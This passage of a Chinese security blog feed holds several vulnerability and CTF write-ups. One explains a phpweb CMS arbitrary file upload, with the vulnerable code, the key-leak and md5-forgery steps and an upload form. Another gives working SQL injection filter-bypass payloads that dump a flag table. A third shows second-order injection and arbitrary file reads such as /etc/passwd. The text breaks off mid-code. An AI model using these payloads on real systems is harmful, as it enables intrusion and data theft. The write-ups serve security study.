class="line">$t=$_POST[<span class="string">"t"</span>];</div><div class="line">$m=$_POST[<span class="string">"m"</span>];</div><div class="line">$act=$_POST[<span class="string">"act"</span>];</div><div class="line">$path=$_POST[<span class="string">"path"</span>];</div><div class="line"></div><div class="line">$md5=md5($k.$t);</div><div class="line"><span class="keyword">if</span>($m!=$md5)&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"ERROR: 安全性校验错误"</span>;</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">//文件上传</span></div><div class="line"><span class="keyword">if</span>($act==<span class="string">"upload"</span>)&#123;</div><div class="line"></div><div class="line">$file=$_FILES[<span class="string">"file"</span>];</div><div class="line">$r_size=$_POST[<span class="string">"r_size"</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"ERROR"</span>] &gt; <span class="number">0</span>)&#123;</div><div class="line">  <span class="keyword">echo</span> <span class="string">"ERROR:"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"ERROR"</span>].<span class="string">"&lt;br /&gt;"</span>;</div><div class="line">  <span class="keyword">exit</span>;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">if</span>($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>]!=$r_size)&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"ERROR:上传文件错误，文件大小和原文件不匹配"</span>;</div><div class="line">@write_log(<span class="string">"app.log"</span>,date(<span class="string">"Y-m-d H:i:s"</span>,time()).<span class="string">" ERROR: 上传文件错误，文件大小和原文件不匹配\n"</span>,FILE_APPEND);</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//检查目录名</span></div><div class="line"></div><div class="line"><span class="keyword">if</span>($path!=<span class="string">""</span>)&#123;</div><div class="line">$ToPath=<span class="string">"../"</span>.$path;</div><div class="line">$Tofile=$ToPath.<span class="string">"/"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</div><div class="line"><span class="keyword">if</span>(!is_dir($ToPath))&#123;</div><div class="line">@mkdir($ToPath,<span class="number">0777</span>);</div><div class="line">&#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">$ToPath=<span class="string">"../update/"</span>;</div><div class="line">$Tofile=<span class="string">"../update/"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!is_writable($ToPath))&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"ERROR:"</span>.$ToPath.<span class="string">" 目录不可写，请设置目录属性为可写"</span>;</div><div class="line">@write_log(<span class="string">"app.log"</span>,date(<span class="string">"Y-m-d H:i:s"</span>,time()).<span class="string">" ERROR: "</span>.$ToPath.<span class="string">" 目录不可写，请设置目录属性为可写\n"</span>,FILE_APPEND);</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(file_exists($Tofile) &amp;&amp; !is_writable($Tofile))&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"ERROR:"</span>.$Tofile.<span class="string">" 文件不能覆盖，请设置文件属性为可写"</span>;</div><div class="line">@write_log(<span class="string">"app.log"</span>,date(<span class="string">"Y-m-d H:i:s"</span>,time()).<span class="string">" ERROR: "</span>.$Tofile.<span class="string">" 文件不能覆盖，请设置文件属性为可写\n"</span>,FILE_APPEND);</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">//复制文件</span></div><div class="line">copy($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],$Tofile);</div><div class="line"></div><div class="line"><span class="keyword">switch</span>($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>])&#123;</div><div class="line"></div><div class="line"><span class="keyword">case</span> <span class="string">"application/octet-stream"</span>:</div><div class="line">@chmod($Tofile,<span class="number">0755</span>);</div><div class="line"><span class="keyword">break</span>;</div><div class="line"></div><div class="line"><span class="keyword">default</span>:</div><div class="line">@chmod($Tofile,<span class="number">0666</span>);</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">echo</span> <span class="string">"文件上传成功: "</span> .substr($Tofile,<span class="number">3</span>);</div><div class="line">@write_log(<span class="string">"app.log"</span>,date(<span class="string">"Y-m-d H:i:s"</span>,time()).<span class="string">" 文件上传成功: "</span>.substr($Tofile,<span class="number">3</span>).<span class="string">"\n"</span>,FILE_APPEND);</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>可以看到这里存在任意文件上传，但是前提是需要通过密钥校验</p><p><img src="http://pic.c1imber.top/blog/20200110/axlunRoNQX9I.png?imageslim" alt="mark"></p><p>这里的<code>$m</code>和<code>$t</code>都是可控的，如果可以在代码当中找到<code>$k</code>的值，就可以通过密钥校验</p><p>通过全局搜索<code>md5(strrev($dbUser.$dbPass))</code>可以在/base/post.php找到该值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">$act = $_POST[<span class="string">'act'</span>];</div><div class="line"></div><div class="line"><span class="keyword">switch</span>($act)&#123;</div><div class="line">...</div><div class="line">...</div><div class="line"><span class="keyword">case</span> <span class="string">"appcode"</span> :</div><div class="line">$pluslable=$_POST[<span class="string">'pluslable'</span>];</div><div class="line">$apptype=$_POST[<span class="string">'apptype'</span>];</div><div class="line">$coltype=$_POST[<span class="string">'coltype'</span>];</div><div class="line">$tempid=$_POST[<span class="string">'tempid'</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span>($apptype==<span class="string">"plus"</span>)&#123;</div><div class="line">$msql-&gt;query(<span class="string">"select id from &#123;P&#125;_base_plusdefault where `pluslable`='$pluslable'"</span>);</div><div class="line"><span class="keyword">if</span>($msql-&gt;next_record())&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"1000"</span>;</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line">$msql-&gt;query(<span class="string">"select id from &#123;P&#125;_base_coltype where `coltype`='$coltype'"</span>);</div><div class="line"><span class="keyword">if</span>($msql-&gt;next_record())&#123;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"2000"</span>;</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>($apptype==<span class="string">"border"</span>)&#123;</div><div class="line">$msql-&gt;query(<span class="string">"select id from &#123;P&#125;_base_border where `tempid`='$tempid'"</span>);</div><div class="line"><span class="keyword">if</span>($msql-&gt;next_record())&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"1000"</span>;</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$code=<span class="string">"k="</span>.md5(strrev($dbUser.$dbPass)).<span class="string">"&amp;t="</span>.time();</div><div class="line"><span class="keyword">echo</span> $code;</div><div class="line"><span class="keyword">exit</span>;</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h3><p>step1:获取<code>$k</code>:<code>md5(strrev($dbUser.$dbPass))</code></p><p><a href="http://192.168.157.130/phpweb/3151/base/post.php" target="_blank" rel="external">http://192.168.157.130/phpweb/3151/base/post.php</a><br>post：act=appcode<br><img src="http://pic.c1imber.top/blog/20200110/Wr17MV9wp8aG.png?imageslim" alt="mark"></p><p>step2:通过<code>$k</code>构造<code>$m</code>和<code>md5($k.$t)</code>,使<code>$m===$md5</code><br><img src="http://pic.c1imber.top/blog/20200110/U5wkxGxKhYDL.png?imageslim" alt="mark"></p><p>step3:构造上传exp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://192.168.157.130/phpweb/3151/base/appplus.php"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span>Upload a new file:<span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"act"</span> <span class="attr">value</span>=<span class="string">"upload"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"m"</span> <span class="attr">value</span>=<span class="string">"26478db11a74b3c8675f463fee30cba7"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"t"</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"r_size"</span> <span class="attr">value</span>=<span class="string">"18"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">size</span>=<span class="string">"18"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"upload"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div></pre></td></tr></table></figure><p>本地构造好上传页面直接上传即可</p><p>注意这里<code>$_POST[&#39;r_size&#39;]</code>要和<code>$_FILES[&#39;file&#39;][&#39;size&#39;]</code>大小相等（字节）</p><p><img src="http://pic.c1imber.top/blog/20200110/ojRmuDjY4Qsz.png?imageslim" alt="mark"></p><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/7053" title="phpweb前台任意文件上传" target="_blank" rel="external">https://xz.aliyun.com/t/7053</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;phpweb前台任意文件上传&quot;&gt;&lt;a href=&quot;#phpweb前台任意文件上传&quot; class=&quot;headerlink&quot; title=&quot;phpweb前台任意文件上传&quot;&gt;&lt;/a&gt;phpweb前台任意文件上传&lt;/h1&gt;&lt;h3 id=&quot;漏洞分析&quot;&gt;&lt;a href=&quot;#漏
      
    
    </summary>
    
      <category term="漏洞分析" scheme="https://c1aysec.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://c1aysec.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>ctf记录-记一次有趣的注入</title>
    <link href="https://c1aysec.github.io/2019/11/03/ctf%E8%AE%B0%E5%BD%95-%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%89%E8%B6%A3%E7%9A%84%E6%B3%A8%E5%85%A5/"/>
    <id>https://c1aysec.github.io/2019/11/03/ctf记录-记一次有趣的注入/</id>
    <published>2019-11-03T02:29:00.000Z</published>
    <updated>2019-11-06T17:11:00.406Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ctf记录-记一次有趣的注入绕过"><a href="#ctf记录-记一次有趣的注入绕过" class="headerlink" title="ctf记录-记一次有趣的注入绕过"></a>ctf记录-记一次有趣的注入绕过</h1><p>正常页面：<br>xxx/article.php?id=2</p><p>当<code>id=2&#39;</code>时返回404(页面不正常)，但是没有sql报错信息<br><img src="http://pic.c1imber.top/blog/20191103/3bsc8Vsv4JIk.png?imageslim" alt="mark"><br>当<code>id=2&quot;</code>时返回正常页面<br><img src="http://pic.c1imber.top/blog/20191103/pid239dEOaan.png?imageslim" alt="mark"><br>所以有可能是单引号包裹的字符型无报错回显注入</p><p>当<code>id=2&#39;--</code>时– 被过滤，<code>id=2&#39;%23</code>页面正常显示,基本确定了存在注入<br><img src="http://pic.c1imber.top/blog/20191103/VQCYSJ7NGEI7.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/20191103/NBypRnQjWQ31.png?imageslim" alt="mark"></p><p>该注入存在过滤，通过简单测试，发现大致过滤了order、information_schema、and、or、逗号等字符，并且对union select进行了过滤，但是union和select单独出现并没有过滤</p><p>另外该注入无sql报错回显，只能使用union联合查询和盲注，由于前者在页面有回显，所以这里优先选择前者</p><p>选择union注入的话，总结出需要突破的几个点：</p><pre><code>1、需要突破对union select的过滤，另外order被过滤，所以不能通过order by判断列数2、注入不能使用逗号3、不能使用information_schema</code></pre><p>接下来，对这些限制进行突破，总之，过滤了什么，绕什么就行了~</p><p>突破1：</p><p>mysql当中<code>/**/</code>可以代替空格，可以使用<code>union/**/select</code>绕过对<code>union select</code>的过滤</p><p>order被过滤，不能使用order by判断列数，使用以下方式判断列数</p><pre><code>id=2&apos; union/**/select 1id=2&apos; union/**/select 1,2...    </code></pre><p>但是这里使用了逗号，被拦截<br><img src="http://pic.c1imber.top/blog/20191103/n0Ssb5lx5C6f.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/20191103/hlj42riH3JhY.png?imageslim" alt="mark"></p><p>突破2：</p><p>不能使用逗号，可以使用子查询绕过</p><pre><code>id=112&apos; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d%23</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/FAgbn0kGvekX.png?imageslim" alt="mark"><br>回显位在2和4，尝试检查查询一些信息，查询成功</p><pre><code>id=112&apos; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select user())d%23</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/quddeGfhqJ6i.png?imageslim" alt="mark"></p><pre><code>id=112&apos; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select version())d%23</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/vOUMiM47pRt8.png?imageslim" alt="mark"></p><pre><code>id=112&apos; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select database())d%23</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/LLR8lDCOKcbU.png?imageslim" alt="mark"><br>但是在通过<code>information_schema</code>获取表名和列名时，被拦截</p><p>突破3：</p><p>关于注入不能使用<code>information_schema</code>,记得之前s1ye师傅有提到过绕过的方法，那时没有怎么研究，又去请教了一番s1ye师傅，得到解答~</p><p>当不能使用<code>information_schema</code>时，可以使用<code>select group_concat(distinct table_name)from mysql.innodb_index_stats</code>获取到表名，很强（看来有必要仔细阅读一下mysql的官方手册了）</p><p>获取表名：<br><code>id=112&#39; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select group_concat(distinct table_name)from mysql.innodb_index_stats)d%23</code><br><img src="http://pic.c1imber.top/blog/20191103/H4AwS6Lzcqdy.png?imageslim" alt="mark"></p><p>接下来就是关于无列名注入的问题了，继续使用子查询就可以解决，获取flag~</p><pre><code>id=112&apos; union/**/select * from ((select 1)a join (select 2)b join (select 3)c join (select group_concat(`3`) from (select * from ((select 1)a join (select 2)b join (select 3)c) union/**/select * from fl111aa44a99g)x)d)%23</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/mvbTH4konJGF.png?imageslim" alt="mark"></p><p>拖延症真的很可怕</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ctf记录-记一次有趣的注入绕过&quot;&gt;&lt;a href=&quot;#ctf记录-记一次有趣的注入绕过&quot; class=&quot;headerlink&quot; title=&quot;ctf记录-记一次有趣的注入绕过&quot;&gt;&lt;/a&gt;ctf记录-记一次有趣的注入绕过&lt;/h1&gt;&lt;p&gt;正常页面：&lt;br&gt;xxx/a
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2019极客巅峰ctf记录</title>
    <link href="https://c1aysec.github.io/2019/10/20/2019%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0ctf%E8%AE%B0%E5%BD%95/"/>
    <id>https://c1aysec.github.io/2019/10/20/2019极客巅峰ctf记录/</id>
    <published>2019-10-19T16:50:00.000Z</published>
    <updated>2019-11-06T17:03:35.474Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2019极客巅峰ctf记录"><a href="#2019极客巅峰ctf记录" class="headerlink" title="2019极客巅峰ctf记录"></a>2019极客巅峰ctf记录</h1><p><strong>周六抽时间做了2019极客巅峰的ctf,发现自己是真的菜，需要找个地方沉淀一下，所以将做出的题记录记录在博客</strong></p><h3 id="aweb-1"><a href="#aweb-1" class="headerlink" title="aweb_1"></a>aweb_1</h3><p><img src="http://pic.c1imber.top/blog/20191020/zY6KbGAP9u64.png?imageslim" alt="mark"></p><p><strong>提示admin才能看到flag1</strong><br><img src="http://pic.c1imber.top/blog/20191020/T16DhJOQLBjb.png?imageslim" alt="mark"></p><p><strong>发现注册处用户名参数存在二次注入，有过滤，使用`name=admin’/</strong>/and/<strong>/‘3`绕过</strong><br><img src="http://pic.c1imber.top/blog/20191020/2mtrs07TKjak.png?imageslim" alt="mark"><br><strong>注册成功，用户名：assssssssss@qq.com，密码：123456’,登录成功，成功获取到flag</strong><br><img src="http://pic.c1imber.top/blog/20191020/xlGk67iKvFUf.png?imageslim" alt="mark"></p><h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p><strong>这道题线上没做出来，比赛结束后研究了一波，:(</strong><br><img src="http://pic.c1imber.top/blog/20191019/VjLvacUQM2uY.png?imageslim" alt="mark"></p><p><strong>打开题目,首页有三个模块，分别为</strong></p><p><strong>查看文件：file.php?file=</strong><br><img src="http://pic.c1imber.top/blog/20191019/1aLGVXSWXCvO.png?imageslim" alt="mark"></p><p><strong>上传文件：upload_file.php</strong><br><img src="http://pic.c1imber.top/blog/20191019/o2XlzFejE61c.png?imageslim" alt="mark"></p><p><strong>下载文件：download.php</strong><br><img src="http://pic.c1imber.top/blog/20191019/KaNmoB7m2Jq9.png?imageslim" alt="mark"></p><p><strong>下载文件页面泄露了部分的源代码，代码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">$name = $_GET[<span class="string">'name'</span>];</div><div class="line">$url = $_SERVER[<span class="string">'QUERY_STRING'</span>];</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($name))&#123;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\.|etc|var|tmp|usr/i'</span>, $url))&#123;</div><div class="line">        <span class="keyword">echo</span>(<span class="string">"hacker!"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/base|class|file|function|index|upload_file/i'</span>, $name))&#123;</div><div class="line">            <span class="keyword">echo</span> (<span class="string">"hacker!"</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">            $name = safe_replace($name);</div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/base|class|file|function|index|upload_file/i'</span>, $name))&#123;</div><div class="line">                $filename = $name.<span class="string">'.php'</span>;</div><div class="line">                $dir =<span class="string">"./"</span>;</div><div class="line">                $down_host = $_SERVER[<span class="string">'HTTP_HOST'</span>].<span class="string">'/'</span>;</div><div class="line">                <span class="keyword">if</span>(file_exists(<span class="keyword">__DIR__</span>.<span class="string">'/'</span>.$dir.$filename))&#123;</div><div class="line">                    $file = fopen ( $dir.$filename, <span class="string">"rb"</span> );</div><div class="line">                    Header ( <span class="string">"Content-type: application/octet-stream"</span> );</div><div class="line">                    Header ( <span class="string">"Accept-Ranges: bytes"</span> );</div><div class="line">                    Header ( <span class="string">"Accept-Length: "</span> . filesize ( $dir.$filename ) );</div><div class="line">                    Header ( <span class="string">"Content-Disposition: attachment; filename="</span> . $filename );</div><div class="line">                    <span class="keyword">echo</span> fread ( $file, filesize ( $dir . $filename ) );</div><div class="line">                    fclose ( $file );</div><div class="line">                    <span class="keyword">exit</span> ();</div><div class="line">                &#125;<span class="keyword">else</span>&#123;</div><div class="line">                    <span class="keyword">echo</span> (<span class="string">"file doesn't exist."</span>);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/flag/i'</span>, $name))&#123;</div><div class="line">                <span class="keyword">echo</span> (<span class="string">"hacker!"</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>这里存在文件下载漏洞，但是存在过滤，暂时无法绕过</strong></p><p><strong>查看页面源代码发现hint:提示flag文件的位置位于<code>/flag</code></strong><br><img src="http://pic.c1imber.top/blog/20191019/10OYU1mrceLm.png?imageslim" alt="mark"></p><p><strong>回过头发现查看文件模块存在任意文件读取:<code>/file.php?file=/etc/passwd</code></strong><br><img src="http://pic.c1imber.top/blog/20191019/4TclaUEmLrtg.png?imageslim" alt="mark"></p><p><strong>尝试直接读取flag文件。失败：</strong><br><img src="http://pic.c1imber.top/blog/20191019/T9xIQW4ABzPz.png?imageslim" alt="mark"></p><p><strong>尝试读取download.php:<code>/file.php?file=download.php</code>读取失败</strong><br><img src="http://pic.c1imber.top/blog/20191019/Q2oFRSeddAD1.png?imageslim" alt="mark"><br><strong>修改为绝对路径<code>/file.php?file=/var/www/html/download.php</code>,读取成功</strong><br><img src="http://pic.c1imber.top/blog/20191019/4wezOnEoEe8a.png?imageslim" alt="mark"><br><strong>完整源码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&lt;html&gt;</div><div class="line">&lt;pre&gt;    </div><div class="line"></div><div class="line">$name = $_GET[<span class="string">'name'</span>];</div><div class="line">$url = $_SERVER[<span class="string">'QUERY_STRING'</span>];</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($name))&#123;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\.|etc|var|tmp|usr/i'</span>, $url))&#123;</div><div class="line">        <span class="keyword">echo</span>(<span class="string">"hacker!"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/base|class|file|function|index|upload_file/i'</span>, $name))&#123;</div><div class="line">            <span class="keyword">echo</span> (<span class="string">"hacker!"</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">            $name = safe_replace($name);</div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/base|class|file|function|index|upload_file/i'</span>, $name))&#123;</div><div class="line">                $filename = $name.<span class="string">'.php'</span>;</div><div class="line">                $dir =<span class="string">"./"</span>;</div><div class="line">                $down_host = $_SERVER[<span class="string">'HTTP_HOST'</span>].<span class="string">'/'</span>;</div><div class="line">                <span class="keyword">if</span>(file_exists(<span class="keyword">__DIR__</span>.<span class="string">'/'</span>.$dir.$filename))&#123;</div><div class="line">                    $file = fopen ( $dir.$filename, <span class="string">"rb"</span> );</div><div class="line">                    Header ( <span class="string">"Content-type: application/octet-stream"</span> );</div><div class="line">                    Header ( <span class="string">"Accept-Ranges: bytes"</span> );</div><div class="line">                    Header ( <span class="string">"Accept-Length: "</span> . filesize ( $dir.$filename ) );</div><div class="line">                    Header ( <span class="string">"Content-Disposition: attachment; filename="</span> . $filename );</div><div class="line">                    <span class="keyword">echo</span> fread ( $file, filesize ( $dir . $filename ) );</div><div class="line">                    fclose ( $file );</div><div class="line">                    <span class="keyword">exit</span> ();</div><div class="line">                &#125;<span class="keyword">else</span>&#123;</div><div class="line">                    <span class="keyword">echo</span> (<span class="string">"file doesn't exist."</span>);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/flag/i'</span>, $name))&#123;</div><div class="line">                <span class="keyword">echo</span> (<span class="string">"hacker!"</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">&lt;/pre&gt;</div><div class="line">&lt;/html&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$name = $_GET[<span class="string">'name'</span>];</div><div class="line">$url = $_SERVER[<span class="string">'QUERY_STRING'</span>];</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($name))&#123;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\.|etc|var|tmp|usr/i'</span>, $url))&#123;</div><div class="line">        <span class="keyword">echo</span>(<span class="string">"hacker!"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/base|class|file|function|index|upload_file/i'</span>, $name))&#123;</div><div class="line">            <span class="keyword">echo</span> (<span class="string">"hacker!"</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">            $name = safe_replace($name);</div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/base|class|file|function|index|upload_file/i'</span>, $name))&#123;</div><div class="line">                $filename = $name.<span class="string">'.php'</span>; <span class="comment">//获取文件名称</span></div><div class="line">                $dir =<span class="string">"./"</span>;  <span class="comment">//相对于网站根目录的下载目录路径</span></div><div class="line">                $down_host = $_SERVER[<span class="string">'HTTP_HOST'</span>].<span class="string">'/'</span>; <span class="comment">//当前域名</span></div><div class="line">                <span class="comment">//判断如果文件存在,则跳转到下载路径</span></div><div class="line">                <span class="keyword">if</span>(file_exists(<span class="keyword">__DIR__</span>.<span class="string">'/'</span>.$dir.$filename))&#123;</div><div class="line">                    $file = fopen ( $dir.$filename, <span class="string">"rb"</span> );    </div><div class="line"></div><div class="line">                    <span class="comment">//告诉浏览器这是一个文件流格式的文件</span></div><div class="line">                    Header ( <span class="string">"Content-type: application/octet-stream"</span> 